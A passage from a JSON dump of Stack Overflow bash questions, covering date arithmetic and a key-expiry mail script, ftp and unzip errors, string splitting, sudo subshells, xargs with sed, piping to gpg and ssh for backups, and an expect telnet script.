]\nthen\n        difference=$1\n        read yd     # Read the YYYYDDD format date\nelse\n        yd=$1\n        difference=$2\nfi\n\ndays=`expr $yd % 1000`\nyear=`expr $yd / 1000`\n\ndays=`expr $days + $difference`\ndaysInYear=`yeardays $year`\n\nwhile [ `expr $days \\&gt; $daysInYear` = 1 ]\ndo\n        days=`expr $days - $daysInYear`\n        year=`expr $year + 1`\n        daysInYear=`yeardays $year`\ndone\n\nwhile [ `expr $days \\&lt; 1` = 1 ]\ndo\n        year=`expr $year - 1`\n        daysInYear=`yeardays $year`\n        days=`expr $days + $daysInYear`\ndone\n\nyd=`expr \\( $year \\* 1000 \\) + $days`       # Final date in YYYYDDD format\necho $yd\n}\n\nymdadd()    # Add/Subtract days to YYYYMMDD format\n{\nif [ X$2 = X ]\nthen\n        difference=$1\n        read ymd    # Read YYYYMMDD format date\nelse\n        ymd=$1\n        difference=$2\nfi\n\necho $ymd | ymd2yd | ydadd $difference | yd2ymd # Convert YYYYMMDD to YYYYDDD, perform date arithmetic, then revert to YYYYMMDD format\n}\n\ndaysLeft()  # Calculate days between two dates in YYYYMMDD format\n{\n# argument check\nif [ X$1 = X ]\nthen\n        read ymd1   # First date in YYYYMMDD format\n        read ymd2   # Second date in YYYYMMDD format\nelif [ X$2 = X ]\nthen\n        ymd1=$1\n        read ymd2\nelse\n        ymd1=$1\n        ymd2=$2\nfi\n\nyear1=`expr $ymd1 / 10000`\nmonth1=`expr \\( $ymd1 % 10000 \\) / 100`\nday1=`expr $ymd1 % 100`\n\nyear2=`expr $ymd2 / 10000`\nmonth2=`expr \\( $ymd2 % 10000 \\) / 100`\nday2=`expr $ymd2 % 100`\n\ndaysm1=`monthdays $year1 $month1`\ndays=`expr $daysm1 - $day1`\nmonth1=`expr $month1 + 1`\n\nwhile [ `expr $month1 \\&lt;= 12` = 1 ]\ndo\n        daysm1=`monthdays $year1 $month1`\n        days=`expr $days + $daysm1`\n        month1=`expr $month1 + 1`\ndone\n\nx=1\nwhile [ `expr $x \\&lt; $month2` = 1 ]\ndo\n        daysm2=`monthdays $year2 $x`\n        days=`expr $days + $daysm2`\n        x=`expr $x + 1`\ndone\n\ndays=`expr $days + $day2`\necho $days\n}\n\n# MAIN BODY\n# Connect to different Servers\ndeclare -a SERVER=('server1' 'server2' 'server3')\nremoteUser=abc\nserverNumbers=${#SERVER[@]}\ncount=0\nwhile [ `expr $count \\&lt; $serverNumbers` = 1 ]\ndo\n    # Connect to  server\n    ssh -T -q $remoteUser@${SERVER[count]} &lt;&lt;-\"END_TEXT\"\n    VALUE=`cat /home/cognos/cognos/c8/configuration/cogstartup.xml | grep -i xsd:long | head -1 | cut -d\"&gt;\" -f2 | sed 's/[:/&lt;|crn:value]*//g'`\n    VALUE_BACKUP=$VALUE\n    let 'VALUE -= 30'       \n    let 'VALUE *= 86400'\n    RESULT1=`perl -e '@stats = stat(\"/home/cognos/cognos/c8/configuration/signkeypair\"); print ((time - $stats[9]) &lt; \"$VALUE\");'`\n    RESULT2=`perl -e '@stats = stat(\"/home/cognos/cognos/c8/configuration/encryptkeypair\"); print ((time - $stats[9]) &lt; \"$VALUE\");'`\n    RESULT3=`perl -e '@stats = stat(\"/home/cognos/cognos/c8/configuration/caSerial\"); print ((time - $stats[9]) &lt; \"$VALUE\");'`\n    while [ \"$RESULT1\" -o \"$RESULT2\" -o \"$RESULT3\" ]\n    do\n            echo \"Sending mail.\"\n            # Calculate days left\n            CURRENT_DATE=`date +\"%Y-%m-%d\" | sed 's/-//g'`\n            CREATION_DATE=`ls -logE /home/cognos/cognos/c8/configuration/ | grep -i signkeypair | awk '{print $4}' | sed 's/-//g'`\n            EXPIRY_DATE=`ymdadd $CREATION_DATE $VALUE_BACKUP`\n            DAYS_LEFT=`daysLeft $CURRENT_DATE $EXPIRY_DATE`\n            # Identify environment from hostname - DEV/UAT/PRD\n            LOCALHOST=`hostname`\n            ENVIRONMENT_TYPE=`echo $LOCALHOST | perl -ne '~m/.*([a-zA-Z]{3})[0-9]*$/; print $1;'|tr '[a-z]' '[A-Z]'`\n            # Identify process - FormPF/GoReporting\n            if (echo $LOCALHOST | grep -i cfp &gt;/dev/null) then\n                   PROCESS=\"FormPF\"\n            else\n                   PROCESS=\"GoReporting\"\n            fi\n            # Add details to mail body\n            echo \"The key was created on `ls -log /home/cognos/cognos/c8/configuration/ | grep -i signkeypair | awk '{print $4,$5,$6}'`, and was set to expire after $VALUE_BACKUP days.\" &gt; mail.txt\n            echo \"Key expires in $DAYS_LEFT days !!\" &gt;&gt; mail.txt\n            echo \" \" &gt;&gt; mail.txt\n            echo \"The server is-\" &gt;&gt; mail.txt\n            hostname &gt;&gt; mail.txt\n            echo \" \" &gt;&gt; mail.txt\n            echo \"Status of folders/files-\" &gt;&gt; mail.txt\n            echo \" \" &gt;&gt; mail.txt\n            ls -log /home/cognos/cognos/c8/configuration/ | grep -i signkeypair | awk '{print $4,$5,$6,$7}' &gt;&gt; mail.txt\n            ls -log /home/cognos/cognos/c8/configuration/ | grep -i encryptkeypair | awk '{print $4,$5,$6,$7}' &gt;&gt; mail.txt\n            ls -log /home/cognos/cognos/c8/configuration/ | grep -i caSerial | awk '{print $4,$5,$6,$7}' &gt;&gt; mail.txt\n        echo \" \" &gt;&gt; mail.txt\n        echo \"To reactive key, please restart the server at weekend with below options:\" &gt;&gt; mail.txt\n        echo \" \" &gt;&gt; mail.txt\n        echo \"/home/cognos/etc/restartAllServers.sh -cdsk\" &gt;&gt; mail.txt\n            # Send warning mail !!\n            SUBJECT=\"!! ($ENVIRONMENT_TYPE) $PROCESS ($LOCALHOST) Cognos CSK(Common Symmetric Key) Expiry !!\"\n            EMAIL=\"xyz@abc.com\"\n            cat mail.txt | mailx -s \"$SUBJECT\" \"$EMAIL\"\n        rm mail.txt\n            break\n    done\n    logout\n    END_TEXT\n    count=`expr $count + 1`\ndone\nexit 0\n</code></pre>\n"},{"tags":["bash","ftp","download","unzip"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13197940,"title":"Cant do anything after ftp transfer","body":"<p>I wrote script for downloading zip files from ftp, and than unziping each different extension to own folder.\n<strong>download.sh</strong></p>\n\n<pre><code>#!/bin/bash\nftp -in sitehere.com &lt;&lt; EOF\nuser username pass\nbinary\nhash\nlcd ./temp\nmget *.zip\nbye\nunzip -n './temp/*.zip' -d ../../base/images/ *.TIF\nunzip -n './temp/*.zip' -d ../../base/dbfs/ *.dbf\n</code></pre>\n\n<p>But after downloading i have in terminal i have 2 errors \"Unknown format\".\nTell me please what I doing wrong?\nThanks.</p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13197475,"title":"Cannot log in to Linux on getty","body":"<p>I was trying to install ncurses on a virtualized Debian server and somehow was unsuccessful. After logging out of the console, I realized that I could not log in anymore. I cannot use tools such as scp, WinSCP or SSH client to get into the server. When I try to log in on the getty console, I get the below message and find myself at the login prompt again. In short, I'm locked out of the [virtual] server. This is a production server and therefore rebooting it would be a last resort. Kindly help.</p>\n\n<pre><code>login as: saichovsky\nsaichovsky@172.16.13.7's password:\nLinux myhost 2.6.32-5-amd64 #1 SMP Wed Jan 11 14:00:43 UTC 2012 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Nov  2 17:39:03 2012 from 192.168.3.166\n-bash: error while loading shared libraries: libncurses.so.5: cannot open shared object file: No such file or directory\n</code></pre>\n"},{"tags":["bash","command-line","io"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13196993,"title":"Adding header into multiple text files","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11563620/sed-awk-to-search-and-replace-insert-text-in-files\">Sed/Awk to search and replace/insert text in files</a>  </p>\n</blockquote>\n\n\n\n<p>I would like to know how to add one \"header\" line into multiple text files contained in one directory. Bash command line would be great!</p>\n\n<p>Thx.</p>\n\n<p><em><strong>EDIT</em></strong></p>\n\n<p>I found my needs in here: <a href=\"http://perldoc.perl.org/index-faq.html\" rel=\"nofollow\">http://perldoc.perl.org/index-faq.html</a> enjoy!\nHere is my answer:</p>\n\n<pre><code>perl -pi -e 'print \"**MyHeaderText**\\n\" if $. == 1' *\n</code></pre>\n"},{"tags":["bash","function","readonly"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13197204,"title":"how to make a function readonly","body":"<p>Having a sample function</p>\n\n<pre><code>function functionName ()\n{\n    echo \"Hello World\"\n}\n</code></pre>\n\n<p>How can I avoid it to be overwritten by a following function with the same name?</p>\n\n<pre><code>function functionName ()\n{\n    echo \"this is another function\"\n}\n</code></pre>\n"},{"tags":["bash","shell","cygwin","set","gnu"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13195655,"title":"Bash set +x without it being printed","body":"<p>Does anyone know if we can say <code>set +x</code> in bash without it being printed:</p>\n\n<pre><code>set -x\ncommand\nset +x\n</code></pre>\n\n<p>traces</p>\n\n<pre><code>+ command\n+ set +x\n</code></pre>\n\n<p>but it should just print</p>\n\n<pre><code>+ command\n</code></pre>\n\n<p>Bash is Version 4.1.10(4). This is bugging me for some time now - output is cluttered with useless <code>set +x</code> lines, making the trace facility not as useful as it could be.</p>\n"},{"tags":["arrays","bash","string-split"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3117,"score":4,"question_id":10586153,"title":"bash split string into array","body":"<p>In a bash script I would like to split a line into pieces and put them into an array.</p>\n\n<p>The line:</p>\n\n<pre><code>Paris, France, Europe\n</code></pre>\n\n<p>I would like to have them in an array like this:</p>\n\n<pre><code>array[0] = Paris\narray[1] = France\narray[2] = Europe\n</code></pre>\n\n<p>I would like to use a simple code, the command's speed doesn't matter. Any ideas?</p>\n"},{"tags":["bash","bioinformatics","scientific-notation","blast"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13192108,"title":"Reading numbers in scientific notation using bash","body":"<p>As part of an annotation pipeline for <em>De Novo</em> fish genomes I need to compare e-values from BLAST to see whether they are lower than a certain threshold.</p>\n\n<p>To get the semantics right I first evaluated one of the othet columns in the blast-output, and it works fine like this:</p>\n\n<pre><code>for f in FOLDER/*; do \nmyVar=$(head -1 $f | awk '{print $4}') ;\nif [[ $myVar -gt 50 ]]; then echo ..... ;done\n</code></pre>\n\n<p>$4 is then a column in the BLAST output with whole numerical values (hit length or something)</p>\n\n<p>However, when I try to change the script to working with the e-values, there is some problems with interpretation of the scientific notation etc...</p>\n\n<p>What I WOULD like is this:</p>\n\n<pre><code>for f in FOLDER/*; do \nmyVar=$(head -1 $f | awk '{print $11}') ;\nif [[ $myVar -gt 1.0e-10 ]]; then echo ..... ;done\n</code></pre>\n\n<p>where $11 points to the e-value for each hit.</p>\n\n<p>Could this be done in a not to cumbersome manner in bash? </p>\n\n<p>All help is deeply appreciated :)</p>\n\n<p>Cheers, \nMartin</p>\n"},{"tags":["linux","bash","unix","scripting"],"answer_count":4,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":2593,"score":5,"question_id":3435312,"title":"How can I execute a series of commands in a bash subshell as another user using sudo?","body":"<p>I'm writing a bash script that needs to sudo multiple commands. I can do this:</p>\n\n<pre><code>( whoami ; whoami )\n</code></pre>\n\n<p>but I can't do this:</p>\n\n<pre><code>sudo ( whoami ; whoami )\n</code></pre>\n\n<p>How do I solve this?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13184385,"title":"Kill sibling process","body":"<p>I would like to have a script which would :</p>\n\n<ul>\n<li>trigger a <code>make 2&amp;&gt;1 | less -R</code></li>\n<li>listen for every change in the folder (using <code>inotifywait -R</code>)</li>\n</ul>\n\n<p>When the folder is modified, the script would have to kill the <code>less</code> process and restart.</p>\n\n<p>I'm not sure about the right way to do this (allow to the two branches of the script to run in parallel + allow the watching job to know the pid of the <code>less</code> job, since the latter have to be in foreground).</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":5,"up_vote_count":20,"down_vote_count":0,"view_count":24764,"score":20,"question_id":4749330,"title":"Test if string exists in file with BASH shell","body":"<p>I have a file that contains directory names :</p>\n\n<p>my_list.txt :</p>\n\n<p>/tmp</p>\n\n<p>/var/tmp</p>\n\n<p>I'd like to check in BASH before I'll add directory name if the name already exists in file</p>\n\n<p>Thanks in advance   </p>\n"},{"tags":["bash","newline"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":630,"score":2,"question_id":8467424,"title":"Echo new line in bash","body":"<p>Tried this:</p>\n\n<pre><code>echo -e \"hello\\nworld\"\n</code></pre>\n\n<p>But it doesn't work. How can I make it work?</p>\n\n<p>P.S.: I'm using Ubuntu 11.04.</p>\n"},{"tags":["bash","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":13175683,"title":"awk parse filename and add result to the end of each line","body":"<p>I have number of files which have similar names like</p>\n\n<pre><code>DWH_Export_AUSTA_20120701_20120731_v1_1.csv.397.dat.2012-10-02 04-01-46.out\nDWH_Export_AUSTA_20120701_20120731_v1_2.csv.397.dat.2012-10-02 04-03-12.out\nDWH_Export_AUSTA_20120801_20120831_v1_1.csv.397.dat.2012-10-02 04-04-16.out\n</code></pre>\n\n<p>etc.</p>\n\n<p>I need to get number before .csv(1 or 2) from the file name and put it into end of every line in file with TAB separator.</p>\n\n<p>I have written this code, it finds number that I need, but i do not know how to put this number into file. There is space in the filename, my script breaks because of it.</p>\n\n<p>Also I am not sure, how to send to script list of files. Now I am working only with one file.</p>\n\n<p>My code:</p>\n\n<pre><code>#!/bin/sh\nstring=\"DWH_Export_AUSTA_20120701_20120731_v1_1.csv.397.dat.2012-10-02 04-01-46.out\" \nout=$(echo $string | awk 'BEGIN {FS=\"_\"};{print substr ($7,0,1)}')\nawk ' { print $0\"\\t$out\" } ' $string\n</code></pre>\n"},{"tags":["bash","sed","awk","xargs"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":13167794,"title":"Using backticks or $() with xargs and sed or awk","body":"<p>Assuming I want to change some filenames that end with <code>jpg.jpg</code> to end only with <code>.jpg</code> (in bash), and I want to do it by piping the output of <code>find</code> to <code>xargs</code>:</p>\n\n<p>By using <code>sed</code>:</p>\n\n<pre><code>find . -iname '*jpg.jpg' | xargs -I % mv -iv % $(echo % | sed 's/jpg.jpg/.jpg/g')\n</code></pre>\n\n<p>However, this does not replace <code>jpg.jpg</code> with <code>.jpg</code> in the destination file of <code>mv</code>.</p>\n\n<p>By using <code>awk</code>:</p>\n\n<pre><code>find . -iname '*jpg.jpg' | xargs -I % mv -iv % $(echo % | awk '{gsub(/jpg.jpg/,\".jpg\")}; 1')\n</code></pre>\n\n<p>This neither does any replacement. Have I missed something?</p>\n"},{"tags":["osx","bash","terminal",".bash-profile"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":13,"score":3,"question_id":13192526,"title":"How to reset Bash on Mac OSX, .bash_profile corrupted and bash no longer works","body":"<p>I am on a MacBook Pro, running the latest version of Mountain Lion.</p>\n\n<p>I really need some help, I have managed some how to damage my .bash_profile (I think) so that every time I open up the terminal I get the error listed below.</p>\n\n<pre><code>-bash: export: `/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/go/bin': not a valid identifier\n-bash: export: `/Users/rob/Applications/sbt/bin:': not a valid identifier\nenv: bash: No such file or directory\nenv: bash: No such file or directory\nenv: bash: No such file or directory\nenv: bash: No such file or directory\nenv: bash: No such file or directory\n-bash: tar: command not found\n-bash: grep: command not found\n-bash: cat: command not found\n-bash: find: command not found\n</code></pre>\n\n<p>I am not sure what has happened, I have no sudo, cd or any normal commands. The only way I have been able to get to any of the main directories is through the go to folder command in finder and try to find the file to no avail. </p>\n\n<p>To top it all off I think I created a file that might be causing the issue, I wanted to edit the .bash_profile so I typed</p>\n\n<pre><code>sudo nano ./bash_profile\n</code></pre>\n\n<p>This open a new file in nano which I think was then saved. After this I opened the real .bash_profile to add in the path for node.js.</p>\n\n<p>If I can get to the .bash_profile I think I can get it back on track but I can't find it, should I reinstall bash? If so how would I do that on a mac, I tried using </p>\n\n<pre><code>brew install bash\n</code></pre>\n\n<p>to which I get </p>\n\n<pre><code>-bash: brew: command not found\n</code></pre>\n\n<p>I am really stuck if anyone can help I would be really appreciated.</p>\n\n<p>Many thanks</p>\n"},{"tags":["linux","bash","ubuntu","command-line","chmod"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13119219,"title":"How to make all files under a directory world readable on linux?","body":"<p>I want to make all files (and directories) under a certain directory world readable without having to chmod each file on its own. it would be great if there is an option to also do this recursively (look under folders and chmod 666 all files under it)</p>\n"},{"tags":["bash","shell","ubuntu"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13191564,"title":"Ubuntu shell script getting error","body":"<p>I am developing simple shell script which copy all my present directory files to <strong>backup</strong> directory which will be exist in present working directory. now i'm getting error when i pass more then one condition in <strong>if</strong>.</p>\n\n<pre><code>#!/bin/bash\nfilename=nx.pdf\nfor i in *;\n do\n echo $i;\n if [ $i == backup || $i == $filename ] ; then\n    echo \"Found backup.\"\n else\n echo \"Part 2\"\n cp -rf $i backup\n fi\n done\n</code></pre>\n\n<p>I am getting error</p>\n\n<pre><code>asd.sh: line 6: [: missing `]'\nasd.sh: line 6: ==: command not found\nPart 2\ndeployee.sh\nasd.sh: line 6: [: missing `]'\nasd.sh: line 6: ==: command not found\nPart 2\n</code></pre>\n"},{"tags":["linux","bash","scripting","module"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":3981,"score":0,"question_id":1127383,"title":"How to issue \"module load\" in a shell or Perl script (i.e., non-interactively)","body":"<p>I can use the \"module load xyz\" command interactively, but when run from a script, it says it can't find the \"module\" command.  Is there any way of loading modules in a script?</p>\n"},{"tags":["bash","unix","cli"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13189862,"title":"Should I use cat instead of dd here?","body":"<p>The article <a href=\"http://unixfoo.blogspot.co.uk/2008/06/encrypting-tar-file-using-openssl.html\" rel=\"nofollow\">Encrypting a tar file using openssl</a> has the following line:</p>\n\n<pre><code>tar cvj ~/Projects/arc/ | openssl smime -encrypt -aes256 -binary -outform DEM public.pem | dd of=arc.bckp\n</code></pre>\n\n<p>we can use cat instead of dd at the end... but should we? which one is better to be used here - cat or dd? and why?</p>\n\n<p>I've 'time'-ed both options and can't see any significant advantage...</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","shell","unix","copy","symlink"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13190365,"title":"Unix Copy (cp) without Symbolic Links","body":"<p>I want to copy my files but convert the symbolic links to hard links (ie. the actual file). How can I do this?</p>\n\n<p>Here's my code (that isn't working):</p>\n\n<pre><code>cp -RL ${FROM_DIR} ${TO_DIR}\n</code></pre>\n\n<p>Note: this is for Xcode purposes - symlinks are not allowed in a build.</p>\n\n<p>Thanks!</p>\n\n<p>EDIT:</p>\n\n<p>The issue is the way I remove the files first - it isn't removing existing symlinks.</p>\n\n<pre><code>rm -RLf \"${FROM_DIR}/*\"\n</code></pre>\n"},{"tags":["bash","shell","filter","highlighting","egrep"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13157947,"title":"Speed up bash filter function to run commands consecutively instead of per line","body":"<p>I have written the following filter as a function in my ~/.bash_profile:</p>\n\n<pre><code>hilite() {\n export REGEX_SED=$(echo $1 | sed \"s/[|()]/\\\\\\&amp;/g\")\n while read line\n do\n  echo $line | egrep \"$1\" | sed \"s/$REGEX_SED/\\x1b[7m&amp;\\x1b[0m/g\"\n done\n exit 0\n}\n</code></pre>\n\n<p>to find lines of anything piped into it matching a regular expression, and highlight matches using ANSI escape codes on a VT100-compatible terminal.</p>\n\n<p>For example, the following finds and highlights the strings <em>bin</em>, <em>U</em> or <em>1</em> which are whole words in the last 10 lines of /etc/passwd:</p>\n\n<pre><code>tail /etc/passwd | hilite \"\\b(bin|[U1])\\b\"\n</code></pre>\n\n<p>However, the script runs very slowly as each line forks an echo, egrep and sed.</p>\n\n<p>In this case, it would be more efficient to do egrep on the entire input, and then run sed on its output.</p>\n\n<p>How can I modify my function to do this? I would prefer to not create any temporary files if possible.</p>\n\n<p>P.S. Is there another way to find and highlight lines in a similar way?</p>\n"},{"tags":["bash","shell","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":13187191,"title":"Printing only the matched pattern between <start> and <end> in sed","body":"<p>Input -</p>\n\n<pre><code>ajflkajlkaj\nddddddddddd/need/to/print/thiskkkkkkkkkkkk\nahfkjahkfja\n</code></pre>\n\n<p>Output needed</p>\n\n<pre><code>/need/to/print/this\n</code></pre>\n\n<p>Googling and tweaking I was able to extract \"this\" like by doing this-</p>\n\n<pre><code>sed -n 's/^.*\\(this\\).*$/\\1/p' myfile\n</code></pre>\n\n<p>but can't seem to get the syntax right for getting the rest of the pattern starting from from \"/need\".</p>\n\n<p>I would appreciate any pointers/suggestions.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13188391,"title":"bash terminate on first fail","body":"<p>Is there a way to make my bash script terminates on the first command that returns non-zero status?</p>\n\n<p>I know I can just chain it with <code>&amp;&amp;</code>'s like:</p>\n\n<pre><code>cd /stuff &amp;&amp;\necho 'what's up' &amp;&amp;\n....\n</code></pre>\n\n<p>Is there another way?</p>\n"},{"tags":["bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13188323,"title":"How does a exec'ed shell know your cwd?","body":"<p>If you <code>cd</code> to some directory other than <code>$HOME</code> and run <code>exec bash</code>, the new bash starts in the working directory of the previous shell.</p>\n\n<p>How does the new bash know what the previous working directory was?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13188041,"title":"How to pass variables in a loop in bash","body":"<p>I found a script on the Internet(https://calomel.org/youtube_wget.html) that wgets youtube videos. </p>\n\n<p>So the script works perfectly for a single clip by simple typing <code>./yt.pl youtubeLink</code> .\nBut I want to scale this up and use it from links in a text document (download.txt)\n. So I created a loop in bash. The loop looks like this.</p>\n\n<p>`</p>\n\n<pre><code>    #!/bin/bash\nwordCount=$(cat download.txt | wc -l)\n\nfor (( number=$wordCount; $number-lt$wordCount;number--))\ndo\n        link=$(sed -n $number\"p\" download.txt)\n        \"./yt.pl \"$link\n        sleep 3\ndone\n</code></pre>\n\n<p>The only problem with this it doesn't work. It gives me the following error message.</p>\n\n<pre><code>/auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=KYzUd95h8X4: No such file or directory\n</code></pre>\n\n<p>if I just run this part of the error message <code>./yt.pl http://www.youtube.com/watch?v=KYzUd95h8X4</code> it works fine.</p>\n\n<p>Here is the complete output of the ssh window</p>\n\n<pre><code>./auto.sh: line 7: ./yt.pl : No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=XEAL23g2V6g: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=KYzUd95h8X4: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=IaADyDhg-CY: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=JmY4RCCCll4: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=D0p5RKzuJLU: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=sY6-PY9wWQ8: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=TRwcozVntTE: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=ft5hp90FV74&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=DB1E4M7bmeM: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=t6w4yeT6OTg&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=t-m88UZXn_8&amp;feature=related: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=iix8NxDN6mQ&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=O3DvUKEZP_0&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=IKVdSNfbilo: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=V3kjn1zM7OI&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=EhJheZepqqY&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=59Oj_xpxh_g&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=DLP8XMMEG0A: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=pCY5ZRXQ3u0&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=a8CHv8n6qpI&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=afJXLpC95lQ&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=6q4dPeUjmu8&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=0BY5V56ZW3w&amp;feature=relmfu: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=9CO__3nHsg8: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=bzgZlV3LzFA&amp;feature=fvst: No such file or directory\n./auto.sh: line 7: ./yt.pl http://www.youtube.com/watch?v=FgS1UQvYtcU&amp;feature=fvst: No such file or directory\n</code></pre>\n"},{"tags":["regex","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13187495,"title":"regex for grep for screen resolution of the form 1280x720","body":"<p>I am trying to give grep a regex pattern for screen resolution(e.g. <code>1280x720</code>) as following</p>\n\n<pre><code>[0-9]{3,}x[0-9]{3,}\n</code></pre>\n\n<p>but it doesn't seem to be working.</p>\n\n<p>The following works but that doesn't translate to the above one.</p>\n\n<pre><code>[0-9][0-9][0-9][0-9]*x[0-9][0-9][0-9][0-9]*\n</code></pre>\n"},{"tags":["linux","bash","pipe"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":161,"score":3,"question_id":11786543,"title":"linux pipe with multiple programs asking for user input","body":"<p>I wonder how to create a pipe </p>\n\n<pre><code>program 1 | ... | program N\n</code></pre>\n\n<p>where multiple of the programs ask for user input. The problem is that <code>|</code> starts the programs in parallel and thus they start reading from the terminal in parallel.</p>\n\n<p>For such cases it would be useful to have a pipe <code>|</code> that starts program (i+1) only after program i has produced some output.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>Example:</p>\n\n<pre><code>cat /dev/sda | bzip2 | gpg -c | ssh user@host 'cat &gt; backup'\n</code></pre>\n\n<p>Here both <code>gpg -c</code> as well as <code>ssh</code> ask for a password.</p>\n\n<p>A workaround for this particular example would be the creation of ssh key pairs, but this is not possible on every system, and I was wondering whether there is a general solution. \nAlso gpg allows for the passphrase to be passed as command line argument, but this is not suggested for security reasons.</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13187338,"title":"What does the following line in this bash script do?","body":"<p>This line is inside my <code>/etc/rc.sysinit</code> file on linux:    </p>\n\n<pre><code>[ -r /proc/mdstat -a -r /dev/md/md-device-map ] &amp;&amp; /sbin/mdadm -IRs\n</code></pre>\n\n<p>I'm not so much interested in what it actually accomplishes as opposed to how the syntax works.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":36,"score":3,"question_id":13185658,"title":"expect in bash script × 16172","body":"<p>I try to set a expect script in bash.</p>\n\n<pre><code>#!/bin/bash\n\n\n/usr/bin/expect &lt;&lt;- EOD\n\nset router 192.168.0.251\nset user admin\nset pass test  \nset timeout 1000  \nset filesave [exec date +%m-%d-%Y]  \n\n\nspawn telnet $router\nsend \"\\n\"  \nexpect \"Username:\"\nsend \"$user\\n\"\nexpect \"Password:\"  \nsend \"$pass\\n\"  \nexpect \"&gt;\"  \nsend \"en\\n\"  \nexpect \"Password:\"  \nsend \"$pass\\n\"  \n\nsend \"term len 0\\n\"  